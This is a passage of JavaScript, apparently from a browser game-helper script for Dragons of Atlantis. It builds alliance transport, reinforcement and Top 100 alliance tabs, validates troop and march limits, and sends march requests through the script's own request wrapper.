					if (options.onFailure) {
						options.onFailure (translate('not-enough-units') + ' ' + translate(p));
					}
					return;
				}
			}
		}

		if (totTroops <= 0){
			if (options.onFailure) {
				options.onFailure (translate('No Troops Defined'));
			}
			return;
		}

		if (totTroops > authMaxTroops) {
			if (options.onFailure) {
				options.onFailure (translate('has-too-many-marches'));
			}
			return;
		}
		
		//check ressource / max load
		if (totRess > max_load ){
			if (options.onFailure) {
				options.onFailure (translate('Too many resources defined'));
			}
			return;
		}

		//check max marches
		if ( Seed.cities[0].figures.marches.maximum - Seed.total.marches <= 0 ) {
			if (options.onFailure) {
				options.onFailure (translate('has-too-many-marches'));
			}
			return;
		}
		
		//Check target

		var targMsg = '<B>' + translate('Transport sent to') + '</B> : ' + options.target.name  + (options.target.city ? (', ' + options.target.city) :'') + '<BR> ' + translate ('at') + ' ' + options.target.x +','+ options.target.y;
		
		verboseLog(targMsg +' '+ translate('attempted'));
		new MyAjax.marches ( {
			city_id    : cityId,
			x          : options.target.x,
			y          : options.target.y,
			units      : units,
			resources  : ress,
			owner_id   : 'attacks',
			delay      : 3000,

			onSuccess  : function ( r ) {
			
				
				Marches.add(r.job.march_id, 'attacks');
				
				Data.options.marches.requests.counter++;
				
				verboseLog(targMsg +' '+ translate('Successfully'));

				actionLog(targMsg);
			
				if (options.onSuccess) {
					options.onSuccess ( r );
				}
			},
			
			onFailure  : function ( r ) {
			
				if (r.status && r.status === 509)
				{
				/*
					if ( Data.options.marches.requests.counter > 30 ) {
						Data.options.marches.requests.max_per_hour = Data.options.marches.requests.counter;
					}
				*/
				}

				if (options.onFailure) {
					options.onFailure (r);
				}
			},

			caller : 'Tabs.Alliance.tabTransport.checkTransport'

		});
	},
	
	plansTick : function (){
		var t = Tabs.Alliance;
		clearTimeout ( t.transport.timer.trsp_table ); t.transport.timer.trsp_table=null;
		t.updateTable ( $id(UID['Tabs.Alliance.tabTransport.auto_transport']) );
		t.transport.timer.trsp_table = setTimeout (t.plansTick, 1000);
	},

	updateTable : function ( table ){
		var t = Tabs.Alliance;
		var plans = Data.options.alliance.auto_trsp.plans;
		var now = parseInt( serverTime() );
		
		if ( table === null || table == undefined ) return;
		var table_output = t.table_output;

		for (var p=0; p<plans.length; p++) {
			var plan = plans[p];
			
			var time_left = plan.run_at - now;
			var time_format;
			if ( time_left < 0 )
			{
				if (!Data.options.alliance.auto_trsp.enabled) {
					time_format = '---';
				} else {
					time_format = '...';
				}
			} 
			else if ( isNaN( time_left ) ){
				time_format = '';
			}
			else {
				time_format = timeFormat( time_left, true );
			}

			var units_title = '';
			var units_detail = '';
			var units_types = getKeys( plan.units );
			for ( var i = 0; i < units_types.length; i++ )
			{
				var current_type = units_types[i];
				
				units_title   += translate( current_type ) + ': ' + plan.units[ current_type ];
				
				units_detail  += '<span class="' + UID['doa-icons'] + ' i-' + current_type + '"></span>'
							  +'<span class=jewel style="display:inline-block;clear:left;height:17px;margin-top:-8px;">' 
							  + ( plan.units[ current_type ] == 1 ? '' : plan.units[ current_type ] )
							  +'</span>  ';

				if ( i !== units_types.length-1 ) {
					units_title  += ' \n';
				}
			}

			var ress_title = '';
			var ress_detail = '';
			var ress_types = getKeys( plan.ress );
			var total_ress = 0;
			for ( var i = 0; i < ress_types.length; i++ )
			{
				var current_type = ress_types[i];
				
				ress_title   += translate( current_type.replace(/_/,' ') ) + ': ' + plan.ress[ current_type ];
				
				ress_detail  += '<span class="' + UID['doa-icons'] + ' i-' + current_type + '"></span>';
				
				total_ress += plan.ress [ current_type ];

				if ( i !== ress_types.length-1 ) {
					ress_title  += '\n';
				}
			}

			ress_detail  += '<span class=jewel style="display:inline-block;clear:left;height:17px;margin-top:-8px;">' 
							     + total_ress 
							     +'</span>  ';
							     
			var marches = getKeys( plan.marches );
			var marches_detail = '';
			var tot_march_go = 0;
			var tot_march_return = 0;
			var tot_march_encamp = 0;
			for ( var i= 0; i < marches.length; i++ )
			{
				var march_id = marches[i];
				var march = Seed.marches[march_id];
				
				if ( march === undefined ) {
					delete Data.options.alliance.auto_trsp.plans[p].marches[march_id];
				} else {
					switch (march.status) {
					case 'encamped' : tot_march_encamp++; break;
					case 'marching' : tot_march_go++; break;
					case 'retreating' : tot_march_return++; break;
					}
				}
				
			}
			if (tot_march_encamp) {
				marches_detail += '<span class="' + UID['doa-icons'] + ' i-encamped">' + tot_march_encamp;
			}
			if (tot_march_go) {
				marches_detail += '<span class="' + UID['doa-icons'] + ' i-marching">' + tot_march_go;
			}
			if (tot_march_return) {
				marches_detail += '<span class="' + UID['doa-icons'] + ' i-retreating">' + tot_march_return;
			}
			

			var iRow, iCell;
			var target = plan.target;

			if ( table_output[plan.id] === undefined ) {
				// Insert a new row
				iRow = table.insertRow( -1 );
				
				// associates the current row number to the id of the march
				table_output[plan.id] = {row:table.rows.length-1};
				
				iRow.setAttribute( 'ref', plan.id );
				
				iRow.title = [
							target.name
							,target.city
							,'[' + target.x + '/' + target.y + ']\n'
							,ress_title + '\n'
							, translate('every') + ' '+timeFormat(plan.delay,false,'NOCOLOR')
				].join(' ');

				// plan Units ... 0
				iCell = iRow.insertCell( -1 );
				iCell.className = 'wrap';
				iCell.style.textAlign = 'left';
				iCell.style.width = '30%';
				iCell.innerHTML =  units_detail;
				
				// plan Resource ... 1
				iCell = iRow.insertCell( -1 );
				iCell.className = 'wrap';
				iCell.style.textAlign = 'left';
				iCell.style.width = '30%';
				iCell.innerHTML =  ress_detail;
				
				// plan Target ... 2
				iCell = iRow.insertCell( -1 );
				iCell.style.textAlign = 'right';
				iCell.innerHTML = '<span class="jewel font7"> [' + target.x +'/'+ target.y +']</span>&nbsp;';
				
				// plan Marches ... 3
				iCell = iRow.insertCell( -1 );
				iCell.style.textAlign = 'right';
				iCell.innerHTML = marches_detail;

				// plan Last Result ... 4
				iCell = iRow.insertCell( -1 );
				iCell.style.textAlign = 'right';
				if (plan.last_res != null) {
					if ( plan.last_res != 'OK') {
						iCell.innerHTML = '<span class="' + UID['doa-icons'] + ' i-cancel">';
						iCell.title = plan.last_res;
					} else {
						iCell.innerHTML = '<span class="' + UID['doa-icons'] + ' i-done">';
						iCell.removeAttribute('title');
					}
				}	else {
					iCell.innerHTML = '';
				}

				// plan time_left ... 5
				iCell = iRow.insertCell( -1 );
				iCell.style.textAlign = 'right';
				iCell.innerHTML = time_format;
				
				// plan Delete Button ... 6
				iCell = iRow.insertCell( -1 );

				var button = document.createElement('input');
				button.type = 'button';

				// Save the current March id in the attibute "ref" of the button
				button.setAttribute( 'ref', plan.id );

				button.className = UID['bnt_red'] + ' thin';
				button.value = '-';

				$J(button).click ( function( event ){
					var self = event.target;
					
					self.disabled = true;
					self.style.display = 'none';
					
					// Take the march id from the "ref" attribute
					var plan_id = parseInt(self.getAttribute( 'ref' ));
					for (var j=0; j<Data.options.alliance.auto_trsp.plans.length;j++) {
						if (Data.options.alliance.auto_trsp.plans[j].id === plan_id) {
							Data.options.alliance.auto_trsp.plans.splice(j,1);
						}
					}
										
				});

				iCell.appendChild( button );
				iCell.style.textAlign = 'right';

			} else {
				/* Upgrade Row
				/*******************/
				if( table_output[plan.id] === undefined ) continue;		

				iRow = table.rows[ table_output[plan.id].row ];
				
				if( iRow === undefined )
				{
					delete table_output[plan.id];
					continue;
				}
				
				// plan Marches ... 3
				iCell=iRow.cells[3];
				iCell.style.textAlign = 'right';
				iCell.innerHTML = marches_detail;

				// plan Last Result ... 4
				iCell=iRow.cells[4];
				iCell.style.textAlign = 'right';
				if (plan.last_res != null) {
					if ( plan.last_res != 'OK') {
						iCell.innerHTML = '<span class="' + UID['doa-icons'] + ' i-cancel">';
						iCell.title = plan.last_res;
					} else {
						iCell.innerHTML = '<span class="' + UID['doa-icons'] + ' i-done">';
						iCell.removeAttribute('title');
					}
				}	else {
					iCell.innerHTML = '';
				}

				// plan time_left ... 5
				iCell=iRow.cells[5];
				iCell.innerHTML = time_format;
				iCell.style.textAlign = 'right';

			}
		}
		
		// Clear table of old data
		var cleared=0;  
		var found = false
		for ( var row = 0; row < table.rows.length; row++ )
		{  
			var plan_id = parseInt(table.rows[row].getAttribute('ref'));  
			found = false;
			for (var j=0; j<Data.options.alliance.auto_trsp.plans.length && !found;j++) {
				var plan=Data.options.alliance.auto_trsp.plans[j];

				if (parseInt(plan.id) === plan_id) {
					found = true;
				}
			}

			if ( !found )  
			{            
				cleared++;  
				table.deleteRow( row );
				delete table_output[plan_id];
				/*
				move back marker to cause it to check 
				the new value at location as old one was deleted.
				*/
				row--;  
				continue;  
			}  
			else if( cleared > 0 )  
			{  
				table_output[plan_id].row -= cleared;   
			}  
		}

	},

	dispFeedback : function (msg)
	{
		if ( msg && msg !== '' ){
			msg = new Date().toTimeString().substring (0,8) + '&nbsp;' + msg;
		}
		$J('#'+UID['Tabs.Alliance.tabTransport.feedback']).html ( msg );
	},

  //** ALLIANCE REINFORCEMENT SUB-TAB ***
	tabReinforcements : function (){
		var t = Tabs.Alliance;
		var f = Tabs.Info;
		var city = Seed.cities[0];
  
		var html = 
			 '<div id=' + setUID('Tabs.Alliance.tabReinforcements.Results') + ' style="height:650px">'
			+'	<div class=' + UID['title'] + '>' + translate('Reinforcements') + '</div>'
			+'	<div style="margin-bottom:5px !important;overflow:hidden !important;">'
			+'	<table class="' + UID['table'] + ' zebra" width=100%>'
			+'		<tr align=left>'
			+'			<th align=left colspan=3>' + translate ('Recipient') + ' : </th>'
			+'		</tr>'
			+'		<tr>'
			+'			<td width=25%><div id=' + setUID('Tabs.Alliance.tabReinforcements.ReinfPlayerList') + '></div></td>'
			+'			<td width=60%><div id=' + setUID('Tabs.Alliance.tabReinforcements.ReinfTarget') + ' style="height: 17px; padding: 2px 0px;"></div></td>'
			+'			<td width=15%>'
			+'				<input id=' + setUID('Tabs.Alliance.tabReinforcements.RefreshMember') + ' type=button class="'+UID['bnt_green']+'" value="' + translate('Refresh Members') + '" />'
			+'			</td>'
			+'		</tr>'
			+'		<tr>'
			+'			<td colspan=3>' 
			+'				&nbsp;'
			+'			</td>'
			+'		</tr>'
			+'	</table>'
			+'	</div>'
			+'	<div style="margin-bottom:5px;overflow:auto;height:550px !important;">'
			+'	<table id=' + setUID('Tabs.Alliance.tabReinforcements.RTroops') + ' class="' + UID['table'] + ' zebra" width=100%>'
			+'		<tr>'
			+'			<th colspan=6>'+ translate('Troops for reinforcement') +':&nbsp;</th>'
			+'		</tr>';
  
		var trp_id = [];
		var btn_max_id = [];

		for ( var i=0; i < f.units_type.length; i++ )
		{
			var num_units = Units.getUnitNumbers( city, f.units_type[i] );


			if (num_units.total > 0 )
			{
				var num = parseIntZero(Data.options.alliance.data.units[f.units_type[i]]);
				var remaining = '( '+ parseInt(num_units.incity - num) +' )';
				
				html += 
				 ' 	<tr>'
				+'		<td class=right width=30%>'
				+'			<span class="' + UID['doa-icons'] + ' i-' + f.units_type[i] + '" ></span>'
				+ 			translate( f.units_type[i] ) + ' : '
				+'		</td>'
				+'		<td width=15%>'
				+'			<input type=text id=' + setUID('Tabs.Alliance.tabReinforcements.Trp_' + f.units_type[i]) +' ref='+ f.units_type[i] +' maxlength=6 style="width:55px" size=2 value="'+ num +'"\>'
				+'		</td>'
				+'		<td width=10%>'
				+'			<input class=small id=' + setUID('Tabs.Alliance.tabReinforcements.MaxT_' + f.units_type[i]) +' ref=' + f.units_type[i] + ' type=button  style="width:auto !important;" value=" Max " \></td>'
				+'		<td align=right width=15% id=' + setUID('Tabs.Alliance.tabReinforcements.InCity_' + f.units_type[i])+'>'+ num_units.incity +'</td>'
				+'		<td align=right class=jewel width=15% id=' + setUID('Tabs.Alliance.tabReinforcements.MchDef_' + f.units_type[i])+'>' + (parseIntZero(num_units.marches + num_units.indefense) ? '&nbsp;+&nbsp;<b>(' + parseIntZero(num_units.marches + num_units.indefense) + ')</b>' : '') + '</td>'
				+'		<td align=right width=15%><span id=' + setUID('Tabs.Alliance.tabReinforcements.RemT_' + f.units_type[i]) +' ref=' + f.units_type[i] + '>'+ remaining +'</span></td>'
				+'	</tr>';
				trp_id.push ( UID['Tabs.Alliance.tabReinforcements.Trp_' + f.units_type[i]] );
				btn_max_id.push ( UID['Tabs.Alliance.tabReinforcements.MaxT_' + f.units_type[i]] );
			}
		}
		html += 
		 '		</table>'
		+'		<table class=' + UID['table'] + ' style="margin-top:3px" width=60%>'
		+'			<tr valign=top align=center>'
		+'				<td width=25%><label><input id=' + setUID('Tabs.Alliance.tabReinforcements.clearAllR') + ' type=button class="'+UID['bnt_green']+'" value="' + translate('Clear all') + '" /></label></td>'
		+'				<td width=25%><label><input id=' + setUID('Tabs.Alliance.tabReinforcements.LaunchR') + ' type=button value="' + translate('Send reinforcement') + '" /></label></td>'
		+'			</tr>'
		+'		</table>'
		+'	</div>'
		+'</div>';

		$J( '#'+UID['Tabs.Alliance.content'] )
		.css ( {
			'height'		: '660px',
			'margin-top'	: '9px',
			'overflow'      : 'hidden'
		})
		.html(html); 

		// Add listener
		$J( '#'+UID['Tabs.Alliance.tabReinforcements.clearAllR']).click( onClickClearAll );
		$J( '#'+UID['Tabs.Alliance.tabReinforcements.LaunchR']).click( SendReinforcement );
		$J( '#'+UID['Tabs.Alliance.tabReinforcements.RefreshMember']).click( function(){
			t.refreshList ();
		} );


		for (i=0; i< trp_id.length; i++){
			$J('#'+trp_id[i]).change( eventTroopsReinforcemment );
			$J('#'+btn_max_id[i]).click( setTroupsMax );
			var butMax = $id(btn_max_id[i])
			if (!butMax) continue;
			setButtonStyle (butMax, true);
  	}
		getMemberList();
		playerCityDesc();
		
		clearInterval ( t.timers.troops ); t.timers.troops=null;
		t.timers.troops = setInterval (TroopsTick, 1000);
  
		function eventTroopsReinforcemment (event){
			var f = Tabs.Info;
			var unit_type = event.target.getAttribute('ref');
			if (!unit_type) return;
			var nb_unit = parseIntZero(event.target.value);
			t.totalForces = 0;
			var currentForces = 0;
			for (var r=0; r < f.units_type.length; r++) {
				if (f.units_type[r] != unit_type) t.totalForces += parseIntZero(Data.options.alliance.data.units[f.units_type[r]]);
				if (f.units_type[r] == unit_type) currentForces = parseIntZero(Units.getUnitNumbers(0,unit_type).incity);
				//$J('#'+UID['Tabs.Alliance.tabReinforcements.Trp_' + f.units_type[r]]).css({backgroundColor:'white'});
			}

			event.target.style.backgroundColor = '';
			
			if (	isNaN(nb_unit) || 
						nb_unit<0 || 
						(nb_unit + parseIntZero(t.totalForces))> Seed.cities[0].figures.marches.maximum_troops || 
						nb_unit > Units.getUnitNumbers(0,unit_type).incity)
			{
				if ((nb_unit + parseIntZero(t.totalForces))> Seed.cities[0].figures.marches.maximum_troops) {
					dialogError (translate('Attack Maximum Troops', t.container));				}
				else {
					dialogError (translate('Invalid number of troops',t.container));
				}
				event.target.style.backgroundColor = '#faa';
				nb_unit = Data.options.alliance.data.units[unit_type];
			}

			event.target.value = nb_unit;
			Data.options.alliance.data.units[unit_type] = nb_unit;
			$J('#'+UID['Tabs.Alliance.tabReinforcements.RemT_' + unit_type]).html('( ' + parseInt(currentForces - nb_unit).intToCommas() + ' )');
		}
		
		function onClickClearAll (){
			var t = Tabs.Alliance;
			var f = Tabs.Info;
			for (var i=0; i < f.units_type.length; i++)
				Data.options.alliance.data.units[f.units_type[i]] = 0;
			t.tabReinforcements();
		}
		
		function setTroupsMax (event){
			var f = Tabs.Info;
			var unit_type = event.target.getAttribute('ref');
			var max = 0;
			var cur = parseIntZero(Units.getUnitNumbers(0,unit_type).incity);
			t.totalForces = 0;
			for (var r=0; r < f.units_type.length; r++) {
				if (f.units_type[r] != unit_type ) t.totalForces += parseIntZero(Data.options.alliance.data.units[f.units_type[r]]);
			}
			max = Seed.cities[0].figures.marches.maximum_troops - parseIntZero(t.totalForces);
			if (max > cur) max = cur;
			Data.options.alliance.data.units[unit_type] = parseIntZero(max);
			
			$J('#'+UID['Tabs.Alliance.tabReinforcements.Trp_' + unit_type]).val(parseIntZero(max));
			$J('#'+UID['Tabs.Alliance.tabReinforcements.RemT_' + unit_type]).html('( ' + parseInt(cur - max).intToCommas() + ' )');
		}
		
		function setButtonStyle ( element , enabled) {
			if ( enabled ) {
				element.disabled = false;
				$J(element).removeClass(UID['bnt_disabled']);
				$J(element).addClass(UID['bnt_green']);
			}
			else {
				element.disabled = true;
				$J(element).removeClass(UID['bnt_green']);
				$J(element).addClass(UID['bnt_disabled']);
			}
		}
		
		function SendReinforcement (){
			var dialogbox = dialogBox({
				id		 : setUID('dialog-sendreinforcement'),
				minWidth : 300,
				centerTo : t.container,
				buttons  : [],
				overlay  : true,
				title	 : translate('Message'),
				html	 : '<center>' +  translate ('Sending reinforcement') + '</center>'
			});

			//Check target
			var found = false;
			var target = {};
			for (var cid=1; cid < Seed.cities.length && !found; cid++) {
				if (Seed.cities[cid] && Data.options.alliance.reinforce_id == Seed.cities[cid].id) {
					found = true;
					target.name = translate(Seed.cities[cid].name);
					target.city = null;
					target.x = Seed.cities[cid].x;
					target.y = Seed.cities[cid].y;
				}
			}
			
			if (!found) {
				for (var i=0; i<Data.dynamic.players.memberships.length && !found; i++){
					if (Data.dynamic.players.memberships[i].player.id == Data.options.alliance.reinforce_id){
						found = true;
						target.name = Data.dynamic.players.memberships[i].player.name;
						target.city = Data.dynamic.players.memberships[i].player.city.name;
						target.x = Data.dynamic.players.memberships[i].player.city.x;
						target.y = Data.dynamic.players.memberships[i].player.city.y;
					}
				}
			}

			if (!found) {
				dialogbox.html('<B>' + translate('No target defined') + '.</B>');
				
				dialogbox.centerTo();
				dialogbox.buttons([
					{
						text: translate('Accept'),
						click: function() { 
							dialogbox.destroy();
						}
					}
				]);
				return;
			}
			
			var targMsg = '<B>' + translate('Sending reinforcement to ') + '</B> : ' + target.name  + (target.city ? (', ' + target.city) :'') + '<BR> ' + translate ('at') + ' ' + target.x +','+ target.y;
			
			dialogbox.html('<center>' + targMsg + '.</center>')

			checkReinforcement ( {	
				
				units     : Data.options.alliance.data.units.cloneProps(),
				
				target    : target,
					
				onSuccess : function( r ) {
					dialogbox.timeOut(2000);
					dialogbox.destroy(); 
				},
				
				onFailure : function( r ) {
				
					if (r.errmsg) {
						dialogbox.html('<B>' + r.errmsg + '.</B>');
					}
					else {
						dialogbox.html('<B>' + r + '.</B>');
					}
				
					dialogbox.centerTo();
					dialogbox.buttons([
						{
							text: translate('Accept'),
							click: function() { 
								dialogbox.destroy();
							}
						}
					]);
				},
			
				caller : 'Tabs.Alliance.tabReinforcements.SendReinforcement'
				
			});

		}
		
		function checkReinforcement (options){
			var t = Tabs.Alliance;
			var cityId = Seed.cities[0].id;
			var cityIdx = 0;
			var availableGeneral = null;
			var units = options.units;
			var target = options.target;
			
			// check troops
			var totTroops = 0;
			for (var p in units){
				if (units[p] > 0){
					totTroops += units[p];
					if (Units.getUnitNumbers(cityIdx,p).incity < units[p]){
						if (options.onFailure) {
							options.onFailure (translate('not-enough-units') + ' ' + translate(p));
						}
						return;
					}
				}
			}
			if (totTroops <= 0){
				if (options.onFailure) {
					options.onFailure (translate('No Troops Defined'));
				}
				return;
			}

			// check max troops
			var authMaxTroops = Seed.cities[0].figures.marches.maximum_troops;
			for (var p in units) {
				if (units[p] > 0) {
					if (units[p] > authMaxTroops) {
						if (options.onFailure) {
							options.onFailure (translate('has-too-many-marches'));
						}
						return;
					}
				}
			}
			if (totTroops > authMaxTroops) {
				if (options.onFailure) {
					options.onFailure (translate('has-too-many-marches'));
				}
				return;
			}
			
			// check max marches
			if ( Seed.cities[0].figures.marches.maximum - Seed.total.marches <= 0 ) {
				if (options.onFailure) {
					options.onFailure (translate('has-too-many-marches'));
				}
				return;
			}

			// check available general
			availableGeneral = getAvailableGeneral ();
			if (availableGeneral == null){
				if (options.onFailure) {
					options.onFailure (translate('No generals available'));
				}
				return;
			}

			//Check target
    	var targMsg = '<B>' + translate('Reinforcement sent to') + '</B> : ' + target.name  + (target.city ? (', ' + target.city) :'') + '<BR> ' + translate ('at') + ' ' + target.x +','+ target.y;
			
			verboseLog(targMsg +' '+ translate('attempted'));
			
			new MyAjax.marches ( {
				city_id    : cityId,
				x          : target.x,
				y          : target.y,
				general_id : availableGeneral.id,
				units      : units,
				owner_id   : 'attacks',
				delay      : 3000,
    	
				onSuccess  : function ( r ) {
				
					
					Marches.add(r.job.march_id, 'attacks');
					
					Data.options.marches.requests.counter++;
					
					verboseLog(targMsg +' '+ translate('Successfully'));
    	
					actionLog(targMsg);
				
					if (options.onSuccess) {
						options.onSuccess ( r );
					}
				},
				
				onFailure  : function ( r ) {
				
					if (r.status && r.status === 509)
					{
					/*
						if ( Data.options.marches.requests.counter > 30 ) {
							Data.options.marches.requests.max_per_hour = Data.options.marches.requests.counter;
						}
					*/
					}
    	
					if (options.onFailure) {
						options.onFailure (r);
					}
				},
    	
				caller : 'Tabs.Alliance.tabReinforcements.checkReinforcement'
    	
			});
		}
		
		function getMemberList (){
			var t = Tabs.Alliance;
			var id_sel;
			var html = '<select id=' + setUID('Tabs.Alliance.tabReinforcements.ReinfPlayer') + '>';
			var selected = '';
			for (var cityIdx=1; cityIdx < Seed.cities.length; cityIdx++) {
				if (Seed.cities[cityIdx]) {
					selected = '';
					if ( cityIdx === 1 ) {
						id_sel = Seed.cities[cityIdx].id;
						selected = ' selected';
					}
					if (Data.options.alliance.reinforce_id == Seed.cities[cityIdx].id) {
						id_sel = Seed.cities[cityIdx].id;
						selected = ' selected';
					}
					html += '<option value="' + Seed.cities[cityIdx].id + '" '+selected+'>' + translate(Seed.cities[cityIdx].name) + '</option>';
				}
			}
			if (Seed.cities.length < 2 && (!Data.dynamic.players.memberships || Data.dynamic.players.memberships.length == 0))
				html += '<option value="">' + translate('To be refreshed') + '</option>';
			else {
				Data.dynamic.players.memberships.sort(function(a, b){a = (a.player.name||'').toLowerCase(); b = (b.player.name||'').toLowerCase(); if (a>b) return 1; if (a <b) return -1; return 0;});
				for (var i=0; i<Data.dynamic.players.memberships.length; i++){
					selected = '';
					if ( i == 0 && !id_sel ) {
						id_sel = Data.dynamic.players.memberships[i].player.id
						selected = ' selected';
					}
					if (Data.dynamic.players.memberships[i].player.id == Data.options.alliance.reinforce_id) {
						id_sel = Data.dynamic.players.memberships[i].player.id
						selected = ' selected';
					}
					html += '<option value="' + Data.dynamic.players.memberships[i].player.id + '" '+selected+'>' + Data.dynamic.players.memberships[i].player.name + '</option>';
				}
			}
			if ( id_sel ) {
				Data.options.alliance.reinforce_id = id_sel;
			}
			html += '</select>';
			$J('#'+UID['Tabs.Alliance.tabReinforcements.ReinfPlayerList']).html(html);
			$J('#'+UID['Tabs.Alliance.tabReinforcements.ReinfPlayer']).change( playerSelChanged );
		}
		
		function playerSelChanged (event){
			var val = event.target.value;
			if (val === undefined || val === null)
				val = 'none';
			event.target.value = val;
			Data.options.alliance.reinforce_id = val;
			playerCityDesc();
		}
		
		function playerCityDesc (){
			var t = Tabs.Alliance;
			var found = false;
			var html='';
			for (var cityIdx=1; cityIdx < Seed.cities.length && !found; cityIdx++) {
				if (Seed.cities[cityIdx] && Data.options.alliance.reinforce_id == Seed.cities[cityIdx].id) {
					found = true;
					var time = Marches.getMarchTime (Seed.cities[cityIdx].x, Seed.cities[cityIdx].y, Data.options.alliance.data.units);
					html = 
					 '<B>' + translate(Seed.cities[cityIdx].name) + '</b>' 
					+' &nbsp; ('+Seed.cities[cityIdx].x + ', '+Seed.cities[cityIdx].y + ') &nbsp;'
					+'<BR>'
					+' <B>' + translate('Distance') + ': </b>' 
					+ Map.getDistance(Seed.cities[0].x, Seed.cities[0].y, Seed.cities[cityIdx].x, Seed.cities[cityIdx].y)
					+ ' ('+timeFormatShort(time)+')';
				}
			}
			if (!found) {
				for (var i=0; i<Data.dynamic.players.memberships.length && !found; i++){
					if (Data.dynamic.players.memberships[i].player.id == Data.options.alliance.reinforce_id){
						found = true;
						var time = Marches.getMarchTime (Data.dynamic.players.memberships[i].player.city.x, Data.dynamic.players.memberships[i].player.city.y, Data.options.alliance.data.units);
						html =
						 translate('City') + ' &nbsp; <B>' + Data.dynamic.players.memberships[i].player.city.name + '</b>' 
						+ ' &nbsp; ('+Data.dynamic.players.memberships[i].player.city.x + ', '+Data.dynamic.players.memberships[i].player.city.y + ') &nbsp;'
						+ ' <BR>'
						+ ' <B>' + translate('Distance') + ': </b>' + Data.dynamic.players.memberships[i].dist
						+ ' ('+timeFormatShort(time)+')';
					}
				}
			}
			$J('#'+UID['Tabs.Alliance.tabReinforcements.ReinfTarget']).html(html); 
		}
		
		function TroopsTick () {
			var t = Tabs.Alliance;
			var f = Tabs.Info;
			for ( var i=0; i < f.units_type.length; i++ )
			{
				var num_units = Units.getUnitNumbers( 0, f.units_type[i] );
				if (num_units.total > 0 )
				{
					var num = parseIntZero(Data.options.alliance.data.units[f.units_type[i]]);
					var remaining = '( '+ parseInt(num_units.incity - num) +' )';
					
					$J('#'+UID['Tabs.Alliance.tabReinforcements.InCity_' + f.units_type[i]]).html(num_units.incity);
					$J('#'+UID['Tabs.Alliance.tabReinforcements.MchDef_' + f.units_type[i]]).html((parseIntZero(num_units.marches + num_units.indefense) ? '&nbsp;+&nbsp;<b>(' + parseIntZero(num_units.marches + num_units.indefense) + ')</b>' : ''));
					$J('#'+UID['Tabs.Alliance.tabReinforcements.RemT_' + f.units_type[i]]).html(remaining);
				}
			}
		}
		
	},

	//** ALLIANCES TOP 100 SUB-TAB ***
	tabAlliances : function (){
		var t = Tabs.Alliance;

		if (!Data.options.alliance.sort_alliance ||
			Data.options.alliance.sort_alliance == null ||
			Data.options.alliance.sort_alliance == undefined)
			Data.options.alliance.sort_alliance = '0';
		if (Data.options.alliance.alliance_update &&
			Data.options.alliance.alliance_update != null &&
			Data.options.alliance.alliance_update != undefined)
			kLastupdate = ' ('+Data.options.alliance.alliance_update+')';
		else kLastupdate = '';

		var html = 
		   '<div id=' + setUID('Tabs.Alliance.tabAlliances.Results') + ' style="height:640px">'
			+'	<div class=' + UID['title'] + '>' + translate('Alliances') + 'Top 100 ' + kLastupdate + '</div>'
			+'	<div style="margin-bottom:5px !important">' //class=' + UID['status_ticker']
			+'		<input type=button value="' + translate('Refresh list') + '" id='+ setUID('Tabs.Alliance.tabAlliances.RefreshAlliances') +' />'
			+'	</div>'
			+'	<div id=' + setUID('Tabs.Alliance.tabAlliances.content') + '></div>' //style="width:490px; max-width:490px; height:620px; max-height:620px; overflow:auto !important; white-space:nowrap; margin-top:1px !important"
			+'</div>';
		$J( '#'+UID['Tabs.Alliance.content'] )
		.css ( {
			'height'		: '670px',
			'margin-top'	: '9px',
			'overflow'      : 'hidden'
		})
		.html(html);

		var html = 
		   '<table class="' + UID['table'] + ' zebra">' // style="width:100%;"
			+'	<tr>'
			+'		<th id=' + setUID('Tabs.Alliance.tabAlliances.taa_0') + ' align=center><A><span>' + translate('Rank') + '</span></A></th>' // width="7%"
			+'		<th id=' + setUID('Tabs.Alliance.tabAlliances.taa_1') + '><A><span>' + translate('Alliance') + '</span></A></th>' // width="30%"
			+'		<th id=' + setUID('Tabs.Alliance.tabAlliances.taa_2') + '><A><span>' + translate('overlord') + '</span></A></th>' // width="30%"
			+'		<th id=' + setUID('Tabs.Alliance.tabAlliances.taa_3') + ' align=center><A><span>' + translate('members') + '</span></A></th>' // width="9%"
			+'		<th id=' + setUID('Tabs.Alliance.tabAlliances.taa_4') + ' align=right><A><span>' + translate('Might') + '</span></A></th>' // width="12%"
			+'		<th align=right><A><span>' + translate('Evol') + '</span></A></th>' //width="12%" 
			+'	</tr>';
		
		if ( Data.dynamic.players.alliances.length > 0) sortAllianceList();
		
		for (var i=0; i<Data.dynamic.players.alliances.length; i++){
			var mightF = parseInt(Data.dynamic.players.alliances[i].might).intToCommas();
			var found = false;
			var evol = 'x', diff = '';
			for (var old=0; old<Data.dynamic.players.alliances_evolution.length && !found; old++){
				if (Data.dynamic.players.alliances_evolution[old].id == Data.dynamic.players.alliances[i].id){
					evol = Data.dynamic.players.alliances[i].might - Data.dynamic.players.alliances_evolution[old].might;
					diff = Data.dynamic.players.alliances[i].member_count - (Data.dynamic.players.alliances_evolution[old].member_count || Data.dynamic.players.alliances[i].member_count);
					if (evol < 0) evol = '<span>' + parseInt(evol).intToCommas().fontcolor('red') + '</span>';
					else if (evol > 0) evol = '<span>'+ ('+' + parseInt(evol).intToCommas()).fontcolor('green') + '</span>';
					else evol = parseInt(evol).intToCommas();
					if (diff < 0) diff = ' (<span>' + parseInt(diff).intToCommas().fontcolor('red') + '</span>)';
					else if (diff > 0) diff = ' (<span>'+ ('+' + parseInt(diff).intToCommas()).fontcolor('green') + '</span>)';
					else diff = '';
					found = true;
				}
			}
			html += 
			 '<tr>'
			+'  <td align=center>' + Data.dynamic.players.alliances[i].rank + '</td>'
			+'	<td align=left>' + getAllianceRelationship(Data.dynamic.players.alliances[i].id, Data.dynamic.players.alliances[i].name) + '</td>'
			+'	<td align=left>' + (Data.dynamic.players.alliances[i].overlord ? Data.dynamic.players.alliances[i].overlord.name : '') + '</td>'
			+'	<td align=center>' + Data.dynamic.players.alliances[i].member_count + diff + '</td>'
			+'	<td align=right>' + mightF + '</td>'
			+'	<td align=right>' + evol + '</td>'
			+'</tr>';
		}
		html += '</table>';
		$J( '#'+UID['Tabs.Alliance.tabAlliances.content'] )
		.css ( {
			'height'		: '600px',
			'width' : '490px',
			'margin-top'	: '1px',
			'overflow'      : 'auto'
		})
		.html(html);
		
		$J( '#'+UID['Tabs.Alliance.tabAlliances.RefreshAlliances'] ).click ( refreshAlllianceList );
		
		for (var h=0; h<5; h++) {
			$J( '#'+UID['Tabs.Alliance.tabAlliances.taa_' + h] ).click ( {sort_taa:h}, Change_sortAllianceList );
		}

		function Change_sortAllianceList (event){
			var t = Tabs.Alliance;

